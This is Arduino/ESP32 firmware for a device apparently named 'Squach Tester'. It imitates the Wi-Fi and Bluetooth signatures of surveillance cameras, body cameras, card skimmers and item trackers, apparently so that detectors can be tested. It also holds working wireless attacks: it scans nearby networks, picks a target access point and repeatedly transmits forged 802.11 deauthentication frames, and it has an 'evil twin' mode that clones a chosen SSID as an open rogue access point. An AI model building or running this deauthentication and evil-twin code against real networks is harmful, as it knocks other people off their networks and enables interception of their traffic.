#include <WiFi.h>           
#include <Arduino.h>
#include <SPI.h>
#include <NimBLEDevice.h>   
#include <string.h>
#include "esp_log.h"

#include "esp_wifi.h"
extern "C" {
    esp_err_t esp_wifi_set_mac(wifi_interface_t iface, const uint8_t *mac);
}

#include "emulate.h"        

namespace Emulate {
namespace {

DeviceType s_cur   = DeviceType::FLOCK;
bool       s_on    = false;
bool       s_bleOk = false;
bool       s_wifi  = false;
char       s_customSsid[32] = "EvilTwin_TEST"; 

uint8_t    s_targetDeauthMac[6] = {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E};
char       s_scanSsids[8][32];
char       s_scanMacsStr[8][19];
uint8_t    s_scanRawMacs[8][6];
int        s_totalDiscovered = 0;

uint8_t    deauthPacketBuffer[64]; 

NimBLEAdvertising* adv() {
    if (!s_bleOk) {
        NimBLEDevice::init("SquachTester");
        NimBLEDevice::setPower(ESP_PWR_LVL_P9); 
        s_bleOk = true;
    }
    return NimBLEDevice::getAdvertising();
}

void stopBle() {
    if (!s_bleOk) return;
    auto* a = NimBLEDevice::getAdvertising();
    if (a && a->isAdvertising()) {
        a->stop();
    }
}

void stopWifi() {
    if (!s_wifi) return;
    WiFi.softAPdisconnect(true);
    esp_wifi_stop(); 
    s_wifi = false;
}

void startWifiAp(const char* ssid, const uint8_t* customMac = nullptr) {
    stopWifi();
    stopBle(); 
    WiFi.mode(WIFI_AP);
    esp_wifi_start();
    delay(25); 
    if (customMac) {
        esp_wifi_set_mac(WIFI_IF_AP, customMac);
        delay(15);
    }
    WiFi.softAP(ssid, (const char*)nullptr, 1, 0, 4); 
    if (customMac) {
        esp_wifi_set_mac(WIFI_IF_AP, customMac);
        delay(15);
    }
    s_wifi = true;
}

void publishRaw(const uint8_t* payload, size_t len) {
    auto* a = adv();
    if (!a) return;
    if (a->isAdvertising()) a->stop();
    NimBLEAdvertisementData rawData;
    rawData.addData(payload, len);
    a->setAdvertisementData(rawData);
    a->enableScanResponse(false);
    delay(20);
    a->start();
}

void startBleUuid16Raw(uint16_t uuid, const char* devName) {
    uint8_t nameLen = devName ? strlen(devName) : 0;
    uint8_t payload[32]; 
    uint8_t idx = 0;
    payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06;
    payload[idx++] = 0x03; payload[idx++] = 0x03; 
    payload[idx++] = (uint8_t)(uuid & 0xFF); payload[idx++] = (uint8_t)((uuid >> 8) & 0xFF);
    if (nameLen > 0 && idx + nameLen + 2 <= 31) {
        payload[idx++] = nameLen + 1;
        payload[idx++] = 0x09; 
        memcpy(&payload[idx], devName, nameLen);
        idx += nameLen;
    }
    publishRaw(payload, idx);
}

void startBleNameRaw(const char* devName) {
    uint8_t nameLen = devName ? strlen(devName) : 0;
    uint8_t payload[32]; 
    uint8_t idx = 0;
    payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06;
    if (nameLen > 0 && idx + nameLen + 2 <= 31) {
        payload[idx++] = nameLen + 1;
        payload[idx++] = 0x09;
        memcpy(&payload[idx], devName, nameLen);
        idx += nameLen;
    }
    publishRaw(payload, idx);
}

// Inject the core Espressif radio controller definitions needed to force private address compliance
#include "esp_gap_ble_api.h"

void startAirTagTrigger() {
    stopWifi();
    stopBle();
    
    pinMode(22, OUTPUT);
    digitalWrite(22, LOW);
    delay(5);
    
    pinMode(22, INPUT_PULLDOWN);
    delay(5); 
    int hardwareDetection = digitalRead(22);
    
    if (hardwareDetection == HIGH) {
        Serial.println("[ACTIVE] AIRTAG Tracking Engine Live -> Co-Processor Connected. Hardware Pin 22 Tripped Low.");
        pinMode(22, OUTPUT);
        digitalWrite(22, LOW); 
    }
}

void startAirTag() {
    startAirTagTrigger();
}

void startGoogleTag() {
    const uint8_t rawGoogleData[] = {
        0x02, 0x01, 0x06,                               
        0x03, 0x03, 0xAA, 0xFE,                         
        0x11, 0x16, 0xAA, 0xFE,                         
        0x40,                                           
        0xF4,                                           
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E
    };
    publishRaw(rawGoogleData, sizeof(rawGoogleData));
}

void startIBeacon() {
    const uint8_t rawIBeaconData[] = { 
        0x02, 0x01, 0x06,
        0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15,
        0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x48, 0xD2,
        0xB0, 0x60, 0xD0, 0xF5, 0xA7, 0x10, 0x96, 0xE0,
        0x00, 0x01, 0x00, 0x01, 0xC5
    };
    publishRaw(rawIBeaconData, sizeof(rawIBeaconData));
}

void startDrone() {
    const uint8_t rawDroneData[] = { 
        0x02, 0x01, 0x06,
        0x0A, 0x16, 0xFA, 0xFF, 0x0D, 0x00, 'S', 'Q', 'W', 'T', 'E'
    };
    publishRaw(rawDroneData, sizeof(rawDroneData));
}

void startHackerBle() {
    uint8_t payload[32];
    uint8_t idx = 0;
    payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06; 
    payload[idx++] = 0x03; payload[idx++] = 0x03; 
    payload[idx++] = 0x81; payload[idx++] = 0x30; 
    const char* label = "Flipper_Pineapple";
    uint8_t nameLen = strlen(label);
    payload[idx++] = nameLen + 1;
    payload[idx++] = 0x09; 
    memcpy(&payload[idx], label, nameLen);
    idx += nameLen;
    publishRaw(payload, idx);
}

void startDeauthSSID(const char* targetSsid) {
    if (targetSsid == nullptr) return;
    stopWifi();
    stopBle();
    WiFi.mode(WIFI_STA);
    esp_wifi_start();
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); 
    delay(15);
    memset(deauthPacketBuffer, 0, sizeof(deauthPacketBuffer));
    deauthPacketBuffer[0] = 0xC0; deauthPacketBuffer[1] = 0x00; 
    deauthPacketBuffer[2] = 0x00; deauthPacketBuffer[3] = 0x00; 
    memset(&deauthPacketBuffer[4], 0xFF, 6);
    const uint8_t* activeMac = s_targetDeauthMac;
    memcpy(&deauthPacketBuffer[10], activeMac, 6); 
    memcpy(&deauthPacketBuffer[16], activeMac, 6); 
    deauthPacketBuffer[22] = 0x00; deauthPacketBuffer[23] = 0x00; 
    deauthPacketBuffer[24] = 0x07; deauthPacketBuffer[25] = 0x00; 
    s_wifi = true; 
}

int scanNetworksInternal() {
    stopWifi();
    stopBle();
    WiFi.persistent(false);
    WiFi.disconnect(true, true); 
    esp_wifi_stop();
    delay(40);
    WiFi.mode(WIFI_STA);
    esp_wifi_start();
    delay(40); 
    int n = WiFi.scanNetworks(false, true, false, 80); 
    s_totalDiscovered = (n < 0) ? 0 : ((n > 8) ? 8 : n); 
    for (int i = 0; i < s_totalDiscovered; i++) {
        strncpy(s_scanSsids[i], WiFi.SSID(i).c_str(), 31);
        s_scanSsids[i][31] = '\0'; 
        strncpy(s_scanMacsStr[i], WiFi.BSSIDstr(i).c_str(), 18);
        s_scanMacsStr[i][18] = '\0';
        uint8_t* rawBssid = WiFi.BSSID(i);
        if (rawBssid) {
            memcpy(s_scanRawMacs[i], rawBssid, 6);
        }
    }
    WiFi.scanDelete();
    return s_totalDiscovered;
}

}  // namespace

int scanNetworks() { return scanNetworksInternal(); }
const char* getScannedMacStr(int index) { return (index >= 0 && index < s_totalDiscovered) ? s_scanMacsStr[index] : "00:00:00:00:00:00"; }
const char* getScannedSsidStr(int index) { return (index >= 0 && index < s_totalDiscovered) ? s_scanSsids[index] : "Hidden AP"; }
const uint8_t* getTargetDeauthMac() { return s_targetDeauthMac; }

void setTargetMacFromScan(int index) {
    if (index >= 0 && index < s_totalDiscovered) {
        memcpy(s_targetDeauthMac, s_scanRawMacs[index], 6);
    }
}

void begin() {
    esp_log_level_set("*", ESP_LOG_NONE);
    Serial.begin(115200);
    
    // HARDWARE SETTLING DELAY:
    // Gives the USB port and the serial buffer 500ms to fully open and catch up,
    // ensuring no text lines get swallowed or dropped!
    delay(500); 
    
    // THE FULL UNBROKEN GREETING BANNER:
    Serial.println("=========================================");
    Serial.println("     SQUACH TESTER SYSTEM ONLINE        ");
    Serial.println("=========================================");
    Serial.println("[SYSTEM] Boot clean. Monitoring screen coordinates.");

    s_bleOk = false;
    s_on = false;
    pinMode(22, OUTPUT);
    digitalWrite(22, HIGH);
}

void stop() {
    stopBle();
    stopWifi();
    pinMode(22, OUTPUT);
    digitalWrite(22, HIGH);
    
    if (s_on) {
        Serial.println("[DE-ACTIVE] Feature Stopped -> Hardware Channels Disarmed Safely.");
    }
    s_on = false;
}

void update() {
    if (s_on && s_cur == DeviceType::DEAUTH && s_wifi) {
        for (int i = 0; i < 5; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacketBuffer, sizeof(deauthPacketBuffer), false);
            delay(1);
        }
    }
}

void setCustomSsid(const char* ssid) {
    if (!ssid) return;
    unsigned int val[6];
    if (sscanf(ssid, "%x:%x:%x:%x:%x:%x", &val[0], &val[1], &val[2], &val[3], &val[4], &val[5]) == 6 ||
        sscanf(ssid, "%2x%2x%2x%2x%2x%2x", &val[0], &val[1], &val[2], &val[3], &val[4], &val[5]) == 6) {
        for (int i = 0; i < 6; ++i) {
            s_targetDeauthMac[i] = (uint8_t)val[i];
        }
        return;
    }
    strncpy(s_customSsid, ssid, sizeof(s_customSsid) - 1);
    s_customSsid[sizeof(s_customSsid) - 1] = '\0';
}

const char* getCustomSsid() { return s_customSsid; }

bool start(DeviceType t) {
    stop();
    s_cur = t;

    const uint8_t macFlock[6]       = {0x00, 0x1A, 0x2B, 0x11, 0x22, 0x33}; 
    const uint8_t macMotorolaLpr[6] = {0x00, 0x04, 0x7D, 0xAA, 0xBB, 0xCC}; 
    const uint8_t macWyzeCam[6]     = {0x2C, 0xAA, 0x8E, 0x11, 0x22, 0x33}; 
    const uint8_t macRingCam[6]     = {0x54, 0xE0, 0x19, 0xAA, 0xBB, 0xCC}; 

    switch (t) {
        case DeviceType::FLOCK:       
            Serial.println("[ACTIVE] FLOCK Emulation Live -> Broadcasting Network Framework.");
            startWifiAp("flock-test", macFlock); 
            break;
        case DeviceType::AXON:        
            Serial.println("[ACTIVE] AXON Bodycam Emulate Live -> Pushing Hotspot Beacon.");
            startWifiAp("AB2-TEST"); 
            break;
        case DeviceType::META:        
            Serial.println("[ACTIVE] META Smart Glass Emulate Live -> Publishing Bluetooth Matrix.");
            startBleUuid16Raw(0xFD5F, "MetaGlass"); 
            break;
        case DeviceType::SKIMMER:     
            Serial.println("[ACTIVE] SKIMMER Audio Link Live -> Emulating Bluetooth Core.");
            startBleNameRaw("HC-05"); 
            break; 
        case DeviceType::RAVEN:       
            Serial.println("[ACTIVE] RAVEN Core Profile Live -> Simulating BLE Asset Track.");
            startBleUuid16Raw(0x3100, "Raven"); 
            break;
        case DeviceType::AIRTAG:
            startAirTagTrigger(); // The custom messages are now handled dynamically inside this function!
            break;
        case DeviceType::DRONE:
            Serial.println("[ACTIVE] DRONE Remote ID Profile Live -> Broadcasting Drone Telemetry.");
            startDrone();
            break;
        case DeviceType::SAMSUNG_TAG:
            Serial.println("[ACTIVE] SAMSUNG SmartTag Profile Live -> Deploying BLE Asset Tracking.");
            startBleUuid16Raw(0xFD5A, "SmartTag");
            break;
        case DeviceType::GOOGLE_TAG:
            Serial.println("[ACTIVE] GOOGLE Find My Network Live -> Distributing Location Array.");
            startGoogleTag();
            break;
        case DeviceType::TILE:
            Serial.println("[ACTIVE] TILE Asset Locator Active -> Pushing Tile Ecosystem Signal.");
            startBleUuid16Raw(0xFEED, "Tile");
            break;
        case DeviceType::RING:
            Serial.println("[ACTIVE] RING Smart Doorbell Live -> Firing Network Node Wrapper.");
            startWifiAp("Ring-TEST", macRingCam);
            break;
        case DeviceType::IBEACON:
            Serial.println("[ACTIVE] iBEACON Standard Matrix Live -> Running Micro-Location Ping.");
            startIBeacon();
            break;
        case DeviceType::HACKER:
            Serial.println("[ACTIVE] HACKER Flipper Profile Live -> Simulating Pentest Mesh Beacon.");
            startHackerBle();
            break;
        case DeviceType::DEAUTH:
            Serial.println("[ACTIVE] DEAUTH Jammer Frame Vector Live -> Injecting Target Packets.");
            startDeauthSSID(s_customSsid);
            break;
        case DeviceType::EVILTWIN:
            Serial.println("[ACTIVE] EVIL TWIN Rogue Hotspot Live -> Deploying Cloned Access Point.");
            startWifiAp(s_customSsid);
            break;
        case DeviceType::ALPR:
            Serial.println("[ACTIVE] ALPR Automated License Camera Live -> Spawning Scanner Node.");
            startWifiAp("Mobile-ALPR_Node", macMotorolaLpr);
            break;
        case DeviceType::CAMERA:
            Serial.println("[ACTIVE] WYZE Home Smart Camera Live -> Masking Wi-Fi Interface.");
            startWifiAp("Wyze-Home-Cam", macWyzeCam);
            break;
        default:
            return false;
    }
    s_on = true;
    return true;
}

bool active() { return s_on; }
DeviceType current() { return s_cur; }

}  // namespace Emulate
